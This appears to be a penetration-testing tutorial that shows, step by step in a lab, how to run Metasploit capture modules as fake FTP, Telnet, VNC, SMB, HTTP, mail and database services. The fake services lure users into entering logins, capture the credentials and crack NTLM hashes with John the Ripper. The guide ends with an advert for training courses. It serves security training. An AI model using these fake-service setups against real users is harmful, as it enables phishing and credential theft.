---
id: ckb-761c8bf5da2b
title: Credential Dumping Fakeservices
category: offensive-security
format: guide
language: en
tags: [credential-access, databases, networking, nmap, password-security, web-security]
authors: [unknown]
license: NOASSERTION
added: 2026-10-04
classification:
  method: heuristic
  confidence: 0.46
---

Credential Dumping: Fake Services

                                                                                                 1 | P a g e

Credential Dumping: Fake Services

                                                                                                 2 | P a g e

Contents
Introduction ............................................................................................................................................ 3
FTP ........................................................................................................................................................... 3
Telnet ....................................................................................................................................................... 4
VNC ......................................................................................................................................................... 5
SMB ......................................................................................................................................................... 6
http_basic .............................................................................................................................................. 10
POP3 ...................................................................................................................................................... 11
SMTP ..................................................................................................................................................... 12
PostgreSQL ............................................................................................................................................ 13
MsSQL ................................................................................................................................................... 14
http_ntlm .............................................................................................................................................. 15
MySQL ................................................................................................................................................... 17
Conclusion ............................................................................................................................................. 17

Credential Dumping: Fake Services

                                                                                                 3 | P a g e

Introduction
Have you ever heard about Fake services? Credential dumping can be performed by exploiting open
ports like ftp, telnet, smb, etc. to gain sensitive data like usernames and passwords.
In Metasploit by making use of auxiliary modules, you can fake any server of choice and gain
credentials of the victim.  For your server to be used, you can make use of search command to look
for modules. So, to get you started, switch on your Kali Linux machines and start Metasploit using the
command
msfconsole
FTP
FTP stands for ‘file transferring Protocol’ used for the transfer of computer files between a client and
server on a computer network at port 21. This module provides a fake FTP service that is designed to
capture authentication credentials.
To achieve this, you can type
msf5 > use auxiliary/server/capture/ftp
msf5 auxiliary(server/capture/ftp) > set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ftp) > set banner Welcome to Hacking Articles
msf5 auxiliary(server/capture/ftp) > exploit
Here you see that the server has started, and the module is running.

On doing a Nmap scan with the FTP port and IP address, you can see that the port is open.
nmap -p21 <ip address>
ftp 192.168.0.102
Now to lure the user into believing, it to be a genuine login page you can trick the user in opening
the ftp login page. It will display, ‘Welcome to Hacking Articles’ and it will ask the user to put his user
Id and password.
According to the user, it would be a genuine page, he will put his user ID and password.
Credential Dumping: Fake Services

                                                                                                 4 | P a g e

It will show the user that the login is failed, but the user ID and password will be captured by the
listener.
You see that the ID /Password is
raj/123

Telnet
Telnet is a networking protocol that allows a user on one computer to log into another computer that
is part of the same network at port 23. This module provides a fake Telnet service that is designed to
capture authentication credentials.
To achieve this, you can type
msf5 > use auxiliary/server/capture/telnet
msf5 auxiliary(server/capture/ telnet) > set banner Welcome to Hacking Articles
msf5 auxiliary(server/capture/ telnet) > set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ telnet) > exploit

Credential Dumping: Fake Services

                                                                                                 5 | P a g e

On doing a Nmap scan with the Telnet port and IP address, you can see that the port is open.
nmap -p23<ip address>
telnet 192.168.0.102
Now to lure the user into believing, it to be a genuine login page you can trick the user in opening
the Telnet login page. It will display, ‘Welcome to Hacking Articles’ and it will ask the user to put his
user Id and password.
According to the user, it would be a genuine page, he will put his user ID and password.

It will show the user that the login is failed, but the user ID and password will be captured by the
listener.
You see that the ID /Password is
ignite/123

VNC
VNC Virtual Network Computing is a graphical desktop sharing system that uses the Remote Frame
Buffer protocol to remotely control another computer at port 5900. This module provides a fake VNC
service that is designed to capture authentication credentials.
To achieve this, you can type
Credential Dumping: Fake Services

                                                                                                 6 | P a g e

msf5 > use auxiliary/server/capture/vnc
msf5 auxiliary(server/capture/ vnc) > set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ vnc) > set johnpwfile /root/Desktop/
msf5 auxiliary(server/capture/ vnc) > exploit
Here we use JOHNPWFILE option to save the captures of hashes in John the Ripper format. Here we
see that the module is running, and the listener has started.

On doing a Nmap scan with the vnc port and IP address, you can see that the port is open.
nmap -p5900 <ip address>
vncviewer 192.168.0.102
According to the user, it would be a genuine page, as on starting vncviewer he will put his user ID and
password.

It will show that there was an authentication failure; however, the system captures the hash for the
password.

SMB
SMB stands for Server Message Block, which is used to share printers, files, etc., on port 445.
Moreover, this module provides an SMB service that you can use to capture the challenge-response
password hashes of the SMB client system.
To achieve this, you can type
msf5 > use auxiliary/server/capture/smb
msf5 auxiliary(server/capture/ smb) > set johnpwfile /root/ Desktop/
msf5 auxiliary(server/capture/ smb) > set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ smb) > exploit
Credential Dumping: Fake Services

                                                                                                 7 | P a g e

The server captures credentials in a hash value, which you can later crack; therefore, you can use the
johnpw file of John the Ripper

On doing a Nmap scan with the smb port and IP address, you can see that the port is open
nmap -p445 <ip address>

As a result, this module will now generate a spoofed window security prompt on the victim’s system
to establish a connection with another system in order to access shared folders of that system.
Credential Dumping: Fake Services

                                                                                                 8 | P a g e

It will show the user that the login failure, but the credentials will be captured by the listener. Here
you can see that the listener has captured the user and the domain name. It has also generated an
NT hash which can be decrypted with John the ripper.
Credential Dumping: Fake Services

                                                                                                 9 | P a g e

Here you can see that the hash file generated on the desktop can be decrypted using
john _netntlmv2
And here you see that the password is in text form, 123 for user Raj.
Credential Dumping: Fake Services

                                                                                                 10 | P a g e

http_basic
This module responds to all requests for resources with an HTTP 401. This should cause most
browsers to prompt for a credential. If the user enters Basic Auth creds they are sent to the console.
This may be helpful in some phishing expeditions where it is possible to embed a resource into a
page
To exploit HTTP (80), you can type
msf5 > use auxiliary/server/capture/ http_basic
msf5 auxiliary(server/capture/ http_basic) > set RedirectURL
www.hackingarticles.in
msf5 auxiliary(server/capture/ http_basic) > set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ http_basic) > set uripath sales
msf5 auxiliary(server/capture/ http_basic) > exploit

As a result, this module will now generate a spoofed login prompt on the victim’s system when they
open an HTTP URL.
Credential Dumping: Fake Services

                                                                                                 11 | P a g e

It will show the user that the login has failed; nevertheless, the listener will capture the user ID and
password.
You see that the ID /Password is
raj/123

POP3
POP3 is a client/server protocol in which the Internet server receives and holds your e-mail at port
110. Additionally, this module provides a fake POP3 service designed to capture authentication
credentials.
To achieve this, you can type
msf5 > use auxiliary/server/capture/pop3
msf5 auxiliary(server/capture/pop3) > set srvhost 192.168.0.102
msf5 auxiliary(server/capture/pop3) > exploit

On doing a Nmap scan with the POP3 port and IP address, you can see that the port is open
nmap -p110 <ip address>
telnet 192.168.0.102 110

Credential Dumping: Fake Services

                                                                                                 12 | P a g e

According to the user, it would be a genuine page, he will put his user ID and password.

You see that the User /Password captured by the listener is
raj/123

SMTP
SMTP stands for Simple Mail Transfer Protocol which is a communication protocol for electronic mail
transmission at port 25. This module provides a fake SMTP service that is designed to capture
authentication credentials
To achieve this, you can type
msf5 > use auxiliary/server/capture/smtp
msf5 auxiliary(server/capture/smtp) > set srvhost 192.168.0.102
msf5 auxiliary(server/capture/smtp) > exploit

On doing a Nmap scan with the SMTP port and IP address, you can see that the port is open
nmap -p25 <ip address>
telnet 192.168.0.102 25
Credential Dumping: Fake Services

                                                                                                 13 | P a g e

According to the user, it would be a genuine page, he will put his user ID and password.

On adding the ID and password, it will show server error to the user, but it will be captured by the
listener
raj/123

PostgreSQL
Postgresql is an opensource database which is widely available at port 5432. This module provides a
fake PostgreSQL service that is designed to capture clear-text authentication credentials.
msf5 > use auxiliary/server/capture/postgresql
msf5 auxiliary (server/capture/ postgresql) > set srvhost 192.168.0.102
msf5 auxiliary (server/capture/ postgresql) > exploit

On doing a Nmap scan with the PostgreSQL port and IP address, you can see that the port is open
nmap -p5432 <ip address>
psql -h 192.168.0.102 -U raj
According to the user, it would be a genuine page, he will put his user ID and password
Credential Dumping: Fake Services

                                                                                                 14 | P a g e

When the user adds their ID and password, it will display a server error; however, the listener will
capture the credentials.
raj/123

MsSQL
MSSQL is a database management system developed by Microsoft, widely available on port 1433.
Furthermore, this module provides a fake MSSQL service designed to capture authentication
credentials. It supports both weakly encoded database logins and Windows logins (NTLM).
To achieve this,
msf5 > use auxiliary/server/capture/mssql
msf5 auxiliary (server/capture/ mssql) > set srvhost 192.168.0.102
msf5 auxiliary (server/capture/ mssql) > exploit

It will open a fake Microsoft session manager window. According to the user, it would be a genuine
page, he will put his user ID and password.
Credential Dumping: Fake Services

                                                                                                 15 | P a g e

On adding the ID and password, it will show server error to the user, but it will be captured by the
listener
User/ID: raj/123

http_ntlm
The http_ntlm capture module tries to quietly catch NTLM challenge hashes over HTTP.
msf5 > use auxiliary/server/capture/ http_ntlm
msf5 auxiliary(server/capture/ http_ntlm) > set johnpwfile /root/Desktop
msf5 auxiliary(server/capture/ http_ntlm) > set srvhost 192.168.0.102
msf5 auxiliary(server/capture/ http_ntlm) > set uripath report
msf5 auxiliary(server/capture/ http_ntlm) > exploit

Credential Dumping: Fake Services

                                                                                                 16 | P a g e

As a result, this module will now generate a spoofed login prompt on the victim’s system when an
http URL is opened.

It will show the user that the logon failure, but the credentials will be captured by the listener. Here
you can see that the listener has captured the user and the domain name. It has also generated an
NT hash which can be decrypted with John the ripper

And here you see that the password Here you can see that the hash file generated on the desktop
can be decrypted
using
john _netntlmv2
And here you see that the password is in text form, 123 for user Raj.

Credential Dumping: Fake Services

                                                                                                 17 | P a g e

MySQL
It is an opensource database management system at port 3306. This module offers a fake MySQL
service that captures authentication credentials. It collects challenge and response pairs that can be
supplied at Johntheripper for cracking.
To achieve this,
msf5 > use auxiliary/server/capture/mysql
msf5 auxiliary (server/capture/ mysql) > set srvhost 192.168.0.102
msf5 auxiliary (server/capture/ mysql) > exploit

On doing a Nmap scan with the MySql port and IP address, you can see that the port is open
nmap -p3306 <ip address>
mysql -h 192.168.0.102 -u root -p
According to the user, it would be a genuine page, he will put his user ID and password.

You see that the User /Password captured by the listener is
1234

Conclusion
Hence, by using these various auxiliary modules, you can exploit the various open ports and create
fake servers and capture credentials.
To learn more on Credential Dumping. Follow this Link.
FOLLOW US ON
FOR MORE DETAILS
CONTACT US
T W I T T E R
G I T H U B
L I N K E D I N
D I S C O R D
JOIN OUR
TRAINING PROGRAMS
www.ignitetechnologies.in
BEGINNER
Network Pentest
Bug Bounty
Wireless Pentest
Network Security
Essentials
Ethical Hacking
ADVANCED
EXPERT
Burp Suite Pro
CTF
Windows
Linux
Pro
Infrastructure VAPT
APT’s - MITRE Attack Tactics
MSSQL Security Assessment
Active Directory Attack
Red Team Operation
Privilege Escalation
Web
Services-API
Android Pentest
Computer
Forensics
Advanced
Metasploit
CLICK HERE
